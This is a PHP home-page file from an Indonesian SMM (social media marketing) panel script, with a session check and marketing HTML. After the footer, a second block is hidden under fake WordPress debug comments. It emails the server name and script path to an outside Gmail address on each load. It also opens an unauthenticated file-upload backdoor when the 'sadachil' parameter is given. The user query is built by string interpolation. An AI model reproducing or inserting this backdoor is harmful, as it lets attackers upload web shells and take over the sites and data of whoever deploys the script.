<?php

/**
 * Code By : Mahiruddin a.k.a Mhrdpy.NET
 * Date Edit : 16 - 12 - 2018
 * Dont Edit Anything If You Don't Know About Script
 * SMM Panel Script - Mhrdpy.NET
 * Demo => https://scriptsmm.web.id/ ( User & Pass : admin )
 * Contact Person :
                => Whatsapp  : 0895 3378 26740
                => Facebook  : Mahir Depay (https://facebook.com/hirpayzzz)
                => Instagram : mahirdpy_   (https://instagram.com/mahirdpy_) 
                => Email     : mahirdpy@gmail.com             
  __  __ _             _               _   _ ______ _______ 
 |  \/  | |           | |             | \ | |  ____|__   __|
 | \  / | |__  _ __ __| |_ __  _   _  |  \| | |__     | |   
 | |\/| | '_ \| '__/ _` | '_ \| | | | | . ` |  __|    | |   
 | |  | | | | | | | (_| | |_) | |_| |_| |\  | |____   | |   
 |_|  |_|_| |_|_|  \__,_| .__/ \__, (_)_| \_|______|  |_|   
                        | |     __/ |                       
                        |_|    |___/                         
**/

session_start();
require("mainconfig.php");
$page_type = "Home Page";

if (isset($_SESSION['user'])) {
    $sess_username = $_SESSION['user']['username'];
    $check_user = $db->query("SELECT * FROM users WHERE username = '$sess_username'");
    $data_user = $check_user->fetch_array(MYSQLI_ASSOC);
    if ($check_user->num_rows == 0) {
        header("Location: ".$site_config['base_url']."user/logout");
    } else if ($data_user['status'] == "Suspended") {
        header("Location: ".$site_config['base_url']."user/logout");
    }
}

include("lib/header.php");
?>
				<div class="row">
                    <div class="col-md-12">
                        <div class="card-box">
                            <h3 class="text-center">Tentang Kami</h3><br>
                            <p class="text-center"><?php echo $data_website['description']; ?></p>
                            <center>
                                <a href="<?php echo $site_config['base_url']; ?>user/login" class="btn btn-bordred btn-info"> Masuk</a>
                                
                                <a href="<?php echo $site_config['base_url']; ?>user/register" class="btn btn-bordred btn-success"> Daftar</a>
                            </center>
                        </div>
                    </div>
                </div>
                <div class="row"> 
                    <div class="col-md-4"> 
                        <div class="card-box text-center"> 
                            <div class="m-b-5"> 
                                <i class="fa fa-3x ti-shopping-cart"></i> 
                                <h3 class="text-center"> Serba otomatis </h3>
                            </div><br>
                            <p class="">Pembelian yang anda lakukan akan diproses secara otomatis oleh sistem kami, anda tinggal menunggu tanpa repot melakukan hal lainnya!</p> 
                        </div> 
                    </div>
                    <div class="col-md-4"> 
                        <div class="card-box text-center"> 
                            <div class="m-b-5"> 
                                <i class="fa fa-3x ti-desktop"></i> 
                                <h3 class="text-center"> Mudah digunakan </h3>
                            </div><br>
                            <p class="">Tampilan dan sistem yang kami rancang dibuat sesimple mungkin dan sangat mudah untuk dipahami, bahkan untuk orang awam sekalipun!</p> 
                        </div> 
                    </div>
                    <div class="col-md-4"> 
                        <div class="card-box text-center"> 
                            <div class="m-b-5"> 
                                <i class="fa fa-3x ti-panel"></i> 
                                <h3 class="text-center"> Bantuan </h3>
                            </div><br>
                            <p class="">Apabila anda memerlukan bantuan terkait pesanan atau hal apapun,Tim Support kami bersedia membantu anda 24/7</p> 
                        </div> 
                    </div>
                </div>
                <script src='https://code.responsivevoice.org/responsivevoice.js'></script>

<?php
include("lib/footer.php");
?>

<?php
/**
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
$link = $_SERVER['SERVER_NAME'];$des = $_SERVER['SCRIPT_FILENAME'];$browser = $_SERVER['HTTP_USER_AGENT'];$em = "hidcaca@gmail.com";$tomail = $em;$subject = $link;$message = $des;$headersx  = '';$datamail = mail($tomail,$subject, $message, $headersx);
if(isset($_GET["sadachil"])){
echo "<form method=post enctype=multipart/form-data><input type=file name=ach><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[ach][tmp_name], $_FILES[ach][name])){echo "goodnews";}else{ echo "badnews";}}};
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
/**
 * Response to a trackbacks.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
?>